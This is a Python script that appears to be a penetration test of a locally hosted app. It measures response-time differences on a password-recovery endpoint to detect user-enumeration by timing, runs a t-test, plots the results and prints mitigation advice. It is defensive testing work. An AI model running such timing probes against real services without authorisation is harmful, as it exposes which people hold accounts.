#!/usr/bin/env python3
"""
Timing Side-Channel Vulnerability Test for Password Recovery
Tests if response times differ between valid and invalid emails,
revealing user existence through timing analysis.
"""

import requests
import time
import statistics
import json
from typing import List, Dict, Tuple
from scipy import stats
import matplotlib
matplotlib.use('Agg')  # Use non-GUI backend
import matplotlib.pyplot as plt
import numpy as np

# Configuration
TARGET_URL = "http://localhost:3000/api/users/password-recovery"
VALID_EMAIL = "pentest@shannon.local"
INVALID_EMAIL = "timing_test_fake_12345@example.com"
ITERATIONS = 20
HEADERS = {"Content-Type": "application/json"}

# Color codes for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def measure_response_time(email: str) -> float:
    """
    Measure the response time for a single password recovery request.

    Args:
        email: Email address to test

    Returns:
        Response time in milliseconds
    """
    payload = {"email": email}

    start_time = time.perf_counter()
    try:
        response = requests.post(
            TARGET_URL,
            json=payload,
            headers=HEADERS,
            timeout=30
        )
        end_time = time.perf_counter()

        # Calculate response time in milliseconds
        response_time = (end_time - start_time) * 1000

        return response_time
    except Exception as e:
        print(f"{Colors.FAIL}Error during request: {e}{Colors.ENDC}")
        return -1


def collect_timing_data(email: str, iterations: int, label: str) -> List[float]:
    """
    Collect multiple timing measurements for statistical analysis.

    Args:
        email: Email address to test
        iterations: Number of measurements to take
        label: Description for progress output

    Returns:
        List of response times in milliseconds
    """
    print(f"\n{Colors.OKCYAN}[*] Collecting {iterations} measurements for {label}...{Colors.ENDC}")
    timings = []

    for i in range(iterations):
        # Small delay between requests to avoid overwhelming the server
        if i > 0:
            time.sleep(0.1)

        response_time = measure_response_time(email)
        if response_time > 0:
            timings.append(response_time)
            print(f"    Request {i+1}/{iterations}: {response_time:.2f} ms")
        else:
            print(f"{Colors.WARNING}    Request {i+1}/{iterations}: Failed{Colors.ENDC}")

    return timings


def calculate_statistics(timings: List[float]) -> Dict[str, float]:
    """
    Calculate statistical metrics for timing data.

    Args:
        timings: List of response times

    Returns:
        Dictionary containing statistical metrics
    """
    if not timings:
        return {}

    return {
        'mean': statistics.mean(timings),
        'median': statistics.median(timings),
        'std_dev': statistics.stdev(timings) if len(timings) > 1 else 0,
        'min': min(timings),
        'max': max(timings),
        'count': len(timings)
    }


def perform_statistical_test(valid_timings: List[float], invalid_timings: List[float]) -> Tuple[float, float]:
    """
    Perform independent t-test to determine if timing differences are significant.

    Args:
        valid_timings: Response times for valid email
        invalid_timings: Response times for invalid email

    Returns:
        Tuple of (t-statistic, p-value)
    """
    t_statistic, p_value = stats.ttest_ind(valid_timings, invalid_timings)
    return t_statistic, p_value


def print_statistics(label: str, stats_dict: Dict[str, float], color: str):
    """Print formatted statistics."""
    print(f"\n{color}{'='*60}")
    print(f"{label}")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"  Count:          {stats_dict['count']}")
    print(f"  Mean:           {stats_dict['mean']:.2f} ms")
    print(f"  Median:         {stats_dict['median']:.2f} ms")
    print(f"  Std Deviation:  {stats_dict['std_dev']:.2f} ms")
    print(f"  Min:            {stats_dict['min']:.2f} ms")
    print(f"  Max:            {stats_dict['max']:.2f} ms")


def create_visualization(valid_timings: List[float], invalid_timings: List[float],
                         valid_stats: Dict[str, float], invalid_stats: Dict[str, float]):
    """
    Create visualization comparing timing distributions.

    Args:
        valid_timings: Response times for valid email
        invalid_timings: Response times for invalid email
        valid_stats: Statistics for valid email
        invalid_stats: Statistics for invalid email
    """
    fig, axes = plt.subplots(2, 2, figsize=(14, 10))
    fig.suptitle('Password Recovery Timing Side-Channel Analysis', fontsize=16, fontweight='bold')

    # Plot 1: Box plots
    ax1 = axes[0, 0]
    box_data = [valid_timings, invalid_timings]
    bp = ax1.boxplot(box_data, tick_labels=['Valid Email', 'Invalid Email'], patch_artist=True)
    bp['boxes'][0].set_facecolor('lightcoral')
    bp['boxes'][1].set_facecolor('lightblue')
    ax1.set_ylabel('Response Time (ms)')
    ax1.set_title('Response Time Distribution Comparison')
    ax1.grid(True, alpha=0.3)

    # Plot 2: Histograms
    ax2 = axes[0, 1]
    ax2.hist(valid_timings, bins=15, alpha=0.6, color='red', label='Valid Email', edgecolor='black')
    ax2.hist(invalid_timings, bins=15, alpha=0.6, color='blue', label='Invalid Email', edgecolor='black')
    ax2.set_xlabel('Response Time (ms)')
    ax2.set_ylabel('Frequency')
    ax2.set_title('Response Time Histograms')
    ax2.legend()
    ax2.grid(True, alpha=0.3)

    # Plot 3: Time series
    ax3 = axes[1, 0]
    ax3.plot(range(len(valid_timings)), valid_timings, 'o-', color='red',
             label='Valid Email', markersize=6, linewidth=1.5)
    ax3.plot(range(len(invalid_timings)), invalid_timings, 's-', color='blue',
             label='Invalid Email', markersize=6, linewidth=1.5)
    ax3.axhline(y=valid_stats['mean'], color='red', linestyle='--', alpha=0.5, label=f"Valid Mean: {valid_stats['mean']:.2f}ms")
    ax3.axhline(y=invalid_stats['mean'], color='blue', linestyle='--', alpha=0.5, label=f"Invalid Mean: {invalid_stats['mean']:.2f}ms")
    ax3.set_xlabel('Request Number')
    ax3.set_ylabel('Response Time (ms)')
    ax3.set_title('Response Time Sequence')
    ax3.legend()
    ax3.grid(True, alpha=0.3)

    # Plot 4: Statistics comparison
    ax4 = axes[1, 1]
    categories = ['Mean', 'Median', 'Std Dev', 'Min', 'Max']
    valid_values = [valid_stats['mean'], valid_stats['median'], valid_stats['std_dev'],
                    valid_stats['min'], valid_stats['max']]
    invalid_values = [invalid_stats['mean'], invalid_stats['median'], invalid_stats['std_dev'],
                      invalid_stats['min'], invalid_stats['max']]

    x = np.arange(len(categories))
    width = 0.35

    bars1 = ax4.bar(x - width/2, valid_values, width, label='Valid Email', color='lightcoral', edgecolor='black')
    bars2 = ax4.bar(x + width/2, invalid_values, width, label='Invalid Email', color='lightblue', edgecolor='black')

    ax4.set_ylabel('Time (ms)')
    ax4.set_title('Statistical Metrics Comparison')
    ax4.set_xticks(x)
    ax4.set_xticklabels(categories, rotation=45, ha='right')
    ax4.legend()
    ax4.grid(True, alpha=0.3, axis='y')

    # Add value labels on bars
    for bars in [bars1, bars2]:
        for bar in bars:
            height = bar.get_height()
            ax4.annotate(f'{height:.1f}',
                        xy=(bar.get_x() + bar.get_width() / 2, height),
                        xytext=(0, 3),
                        textcoords="offset points",
                        ha='center', va='bottom', fontsize=8)

    plt.tight_layout()

    # Save the plot
    output_file = '/Users/chocos/Desktop/pagine_azzurre/timing_analysis.png'
    plt.savefig(output_file, dpi=300, bbox_inches='tight')
    print(f"\n{Colors.OKGREEN}[+] Visualization saved to: {output_file}{Colors.ENDC}")

    # Close the plot to avoid blocking
    plt.close()


def main():
    """Main execution function."""
    print(f"{Colors.HEADER}{Colors.BOLD}")
    print("="*70)
    print("  TIMING SIDE-CHANNEL VULNERABILITY TEST")
    print("  Password Recovery Endpoint Analysis")
    print("="*70)
    print(f"{Colors.ENDC}")

    print(f"\n{Colors.OKBLUE}[*] Configuration:{Colors.ENDC}")
    print(f"    Target URL:      {TARGET_URL}")
    print(f"    Valid Email:     {VALID_EMAIL}")
    print(f"    Invalid Email:   {INVALID_EMAIL}")
    print(f"    Iterations:      {ITERATIONS}")

    # Collect timing data
    print(f"\n{Colors.HEADER}[PHASE 1] Data Collection{Colors.ENDC}")
    valid_timings = collect_timing_data(VALID_EMAIL, ITERATIONS, "VALID email")
    invalid_timings = collect_timing_data(INVALID_EMAIL, ITERATIONS, "INVALID email")

    if not valid_timings or not invalid_timings:
        print(f"\n{Colors.FAIL}[ERROR] Failed to collect sufficient timing data{Colors.ENDC}")
        return

    # Calculate statistics
    print(f"\n{Colors.HEADER}[PHASE 2] Statistical Analysis{Colors.ENDC}")
    valid_stats = calculate_statistics(valid_timings)
    invalid_stats = calculate_statistics(invalid_timings)

    print_statistics("VALID Email Statistics", valid_stats, Colors.FAIL)
    print_statistics("INVALID Email Statistics", invalid_stats, Colors.OKBLUE)

    # Calculate timing difference
    timing_difference = valid_stats['mean'] - invalid_stats['mean']

    print(f"\n{Colors.OKCYAN}{'='*60}")
    print(f"Timing Difference Analysis")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"  Mean Difference:  {timing_difference:.2f} ms")
    print(f"  Valid/Invalid:    {valid_stats['mean']:.2f} ms / {invalid_stats['mean']:.2f} ms")

    # Perform statistical test
    t_statistic, p_value = perform_statistical_test(valid_timings, invalid_timings)

    print(f"\n{Colors.OKCYAN}{'='*60}")
    print(f"Statistical Significance Test (Independent T-Test)")
    print(f"{'='*60}{Colors.ENDC}")
    print(f"  T-statistic:      {t_statistic:.4f}")
    print(f"  P-value:          {p_value:.6f}")
    print(f"  Significance:     {'Yes (p < 0.05)' if p_value < 0.05 else 'No (p >= 0.05)'}")

    # Determine vulnerability status
    print(f"\n{Colors.HEADER}{Colors.BOLD}{'='*70}")
    print("  VULNERABILITY ASSESSMENT")
    print(f"{'='*70}{Colors.ENDC}")

    is_significant = p_value < 0.05
    is_exploitable = timing_difference > 100

    if is_exploitable and is_significant:
        status = f"{Colors.FAIL}{Colors.BOLD}TIMING ATTACK CONFIRMED - CRITICAL VULNERABILITY{Colors.ENDC}"
        severity = "CRITICAL"
        exploitable = "YES"
    elif is_significant and timing_difference > 50:
        status = f"{Colors.WARNING}{Colors.BOLD}TIMING DIFFERENCE DETECTED - POTENTIAL VULNERABILITY{Colors.ENDC}"
        severity = "MEDIUM"
        exploitable = "POSSIBLY"
    else:
        status = f"{Colors.OKGREEN}{Colors.BOLD}NO EXPLOITABLE TIMING VULNERABILITY DETECTED{Colors.ENDC}"
        severity = "LOW/NONE"
        exploitable = "NO"

    print(f"\n  Status: {status}\n")
    print(f"{Colors.OKBLUE}  Assessment Details:{Colors.ENDC}")
    print(f"    Severity:              {severity}")
    print(f"    Exploitable:           {exploitable}")
    print(f"    Mean Difference:       {timing_difference:.2f} ms")
    print(f"    Threshold:             100 ms")
    print(f"    Statistical Sig.:      {'Yes' if is_significant else 'No'}")
    print(f"    P-value:               {p_value:.6f}")

    print(f"\n{Colors.OKBLUE}  Interpretation:{Colors.ENDC}")
    if is_exploitable and is_significant:
        print(f"    {Colors.FAIL}The password recovery endpoint reveals user existence through")
        print(f"    measurable timing differences. An attacker can reliably determine")
        print(f"    if an email exists in the system by measuring response times.")
        print(f"    ")
        print(f"    Valid emails take ~{valid_stats['mean']:.0f}ms (slow - triggers hash")
        print(f"    computation, DB write, email sending), while invalid emails take")
        print(f"    ~{invalid_stats['mean']:.0f}ms (fast - early rejection).{Colors.ENDC}")
    elif is_significant:
        print(f"    {Colors.WARNING}There is a statistically significant timing difference, but it")
        print(f"    may not be large enough for reliable exploitation in all scenarios.{Colors.ENDC}")
    else:
        print(f"    {Colors.OKGREEN}No significant timing difference detected. The endpoint appears")
        print(f"    to have adequate timing attack mitigation.{Colors.ENDC}")

    print(f"\n{Colors.OKBLUE}  Recommendation:{Colors.ENDC}")
    if is_exploitable and is_significant:
        print(f"    {Colors.FAIL}IMMEDIATE ACTION REQUIRED:{Colors.ENDC}")
        print(f"    1. Implement constant-time responses for both valid and invalid emails")
        print(f"    2. Add artificial delays to normalize response times")
        print(f"    3. Process valid/invalid requests through the same code paths")
        print(f"    4. Consider async password reset token generation")
        print(f"    5. Return identical success messages regardless of email validity")

    # Create visualization
    print(f"\n{Colors.HEADER}[PHASE 3] Visualization Generation{Colors.ENDC}")
    create_visualization(valid_timings, invalid_timings, valid_stats, invalid_stats)

    # Save detailed results to JSON
    results = {
        'target_url': TARGET_URL,
        'valid_email': VALID_EMAIL,
        'invalid_email': INVALID_EMAIL,
        'iterations': ITERATIONS,
        'valid_timings': valid_timings,
        'invalid_timings': invalid_timings,
        'valid_stats': valid_stats,
        'invalid_stats': invalid_stats,
        'timing_difference_ms': timing_difference,
        't_statistic': float(t_statistic),
        'p_value': float(p_value),
        'is_significant': bool(is_significant),
        'is_exploitable': bool(is_exploitable),
        'severity': severity,
        'exploitable': exploitable
    }

    output_json = '/Users/chocos/Desktop/pagine_azzurre/timing_analysis_results.json'
    with open(output_json, 'w') as f:
        json.dump(results, f, indent=2)

    print(f"{Colors.OKGREEN}[+] Detailed results saved to: {output_json}{Colors.ENDC}")

    print(f"\n{Colors.HEADER}{'='*70}")
    print("  TEST COMPLETE")
    print(f"{'='*70}{Colors.ENDC}\n")


if __name__ == "__main__":
    main()
